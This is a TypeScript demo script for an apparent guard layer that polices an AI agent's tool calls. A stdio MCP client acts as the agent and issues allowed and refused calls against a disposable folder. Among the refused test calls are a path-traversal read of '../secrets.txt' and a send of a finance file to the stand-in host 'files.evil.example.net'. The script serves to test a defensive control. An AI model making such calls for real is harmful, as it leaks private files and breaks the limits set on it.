/**
 * Live demonstration of the MCP integration against a RUNNING Heimdall server, with a real stdio MCP client standing in for the AI.
 *
 *   HEIMDALL_URL=http://localhost:8787 HEIMDALL_KEY=asg_... npx tsx scripts/live-mcp.ts [protected-folder] [keep-alive-minutes]
 *
 * It prepares a disposable protected folder (default: %USERPROFILE%\HeimdallProtected), runs a few allowed and refused tool calls
 * (observing the folder from this process to confirm side effects), then stays connected so the executor keeps reporting health.
 */
import { existsSync, mkdirSync, readFileSync, writeFileSync } from "node:fs";
import { homedir } from "node:os";
import { join, resolve } from "node:path";
import { Client } from "@modelcontextprotocol/sdk/client/index.js";
import { StdioClientTransport } from "@modelcontextprotocol/sdk/client/stdio.js";

const url = process.env.HEIMDALL_URL ?? "http://localhost:8787";
const key = process.env.HEIMDALL_KEY;
if (!key) throw new Error("HEIMDALL_KEY is required");
const root = resolve(process.argv[2] ?? join(homedir(), "HeimdallProtected"));
const keepMin = Number(process.argv[3] ?? 0);

mkdirSync(join(root, "docs", "finance"), { recursive: true });
mkdirSync(join(root, "summaries"), { recursive: true });
const seed = (rel: string, text: string) => existsSync(join(root, rel)) || writeFileSync(join(root, rel), text);
seed("docs/handbook.txt", "DISPOSABLE FIXTURE. Employee handbook: remote Fridays, 30-day reimbursements.");
seed("docs/old-notes.txt", "DISPOSABLE FIXTURE. Superseded meeting notes.");
seed("docs/finance/q3.txt", "DISPOSABLE FIXTURE. Draft quarterly numbers.");

const client = new Client({ name: "live-demo-agent", version: "1.0.0" });
const transport = new StdioClientTransport({
  command: process.execPath,
  args: ["--import", "tsx", resolve("src/integrations/mcp/server.ts")],
  env: { PATH: process.env.PATH ?? "", SystemRoot: process.env.SystemRoot ?? "", LOCALAPPDATA: process.env.LOCALAPPDATA ?? "", USERPROFILE: process.env.USERPROFILE ?? "", HEIMDALL_URL: url, HEIMDALL_KEY: key, HEIMDALL_ROOT: root },
  stderr: "inherit",
});
await client.connect(transport);
const call = async (name: string, args: Record<string, unknown>) => {
  const r: any = await client.callTool({ name, arguments: args });
  const text = String(r.content?.[0]?.text ?? "");
  console.log(`${r.isError ? "REFUSED/FAILED" : "OK           "}  ${name}(${JSON.stringify(args)})\n               -> ${text.split("\n")[0].slice(0, 170)}`);
  return text;
};

console.log(`\nProtected folder: ${root}`);
await call("read_document", { path: "docs/handbook.txt" });
await call("write_summary", { path: `summaries/summary-${Date.now().toString(36)}.txt`, text: "Summary: remote Fridays; 30-day reimbursements." });
const before = readFileSync(join(root, "docs", "old-notes.txt"), "utf8");
await call("delete_document", { path: "docs/old-notes.txt" });
console.log(`               (observed on disk: old-notes.txt still present = ${existsSync(join(root, "docs", "old-notes.txt"))}, unchanged = ${readFileSync(join(root, "docs", "old-notes.txt"), "utf8") === before})`);
await call("read_document", { path: "../secrets.txt" });
await call("send_document", { path: "docs/finance/q3.txt", destination: "https://files.evil.example.net/upload" });
await call("run_command", { command: "powershell -c Get-Process" });
console.log("\nDone. The pending delete is waiting for approval in the dashboard (Approvals).");
if (keepMin > 0) {
  console.log(`Staying connected for ${keepMin} minutes so the executor keeps reporting health (Ctrl+C to stop).`);
  await new Promise((r) => setTimeout(r, keepMin * 60_000));
}
await client.close();
